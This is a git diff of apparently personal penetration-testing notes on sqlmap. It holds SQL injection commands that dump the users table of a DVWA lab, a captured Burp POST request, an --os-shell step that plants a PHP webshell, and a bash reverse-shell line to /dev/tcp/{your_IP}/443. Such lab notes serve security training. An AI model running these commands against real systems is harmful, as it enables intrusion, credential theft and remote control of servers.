@@ -1,6 +1,14 @@
 # sqlmap
 
 
+Although sqlmap is a great tool to automate SQLi attacks, it provides next-to- zero stealth.
+Due to its high-volume of traffic, sqlmap should not be used as a first choice tool during assignments that require staying under the radar.
+
+
+
+
+
+
 ## Resources
 - <https://github.com/sqlmapproject/sqlmap>
 - <https://medium.com/@Rad1antC0d3/sqlmap-a-comprehensive-guide-for-begineers-f0ecd75f11ad>
@@ -10,7 +18,7 @@
 
 
 
-## commands
+## Commands
 
 ```
 sqlmap -u "http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=cd8043482ce3c6e073f6c71cc520b195; security=low"
@@ -25,8 +33,77 @@ sqlmap -u "http://localhost:4280/vulnerabilities/sqli_blind/" --cookie="PHPSESSI
 
 sqlmap -u "http://localhost:4280/vulnerabilities/sqli_blind/" --cookie="PHPSESSID=cd8043482ce3c6e073f6c71cc520b195; security=medium" --data="id=1&Submit=Submit" -p id -T users --batch --threads 5 --dump
 
+```
+
+
+
+
+
+## Shell
+
+### 1 - First, we need to intercept the POST request via Burp and save it as a local text file
+```
+POST /search.php HTTP/1.1
+Host: 192.168.50.19
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 9
+Origin: http://192.168.50.19
+Connection: close
+Referer: http://192.168.50.19/search.php
+Cookie: PHPSESSID=vchu1sfs34oosl52l7pb1kag7d
+Upgrade-Insecure-Requests: 1
+
+item=test
 
 ```
+
+
+### 2 - Next, we can invoke `sqlmap` with the `-r` parameter, using our file containing the POST request as an argument. We also need to indicate which parameter is vulnerable to sqlmap, in our case item. Finally, we'll include `--os-shell` along with the custom writable folder we found earlier.
+
+```
+sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
+```
+
+
+### 3 -Once sqlmap confirms the vulnerability, it prompts us for the language the web application is written in, which is PHP in this case. Next, sqlmap uploads the webshell to the specified web folder and returns the interactive shell, from which we can issue regular system commands.
+
+```
+os-shell> pwd
+do you want to retrieve the command standard output? [Y/n/a] y
+command standard output: '/var/www/html/tmp'
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 ## Command injection
@@ -41,6 +118,65 @@ bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1" ## pass this to sqlmap shell co
 
 
 ```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
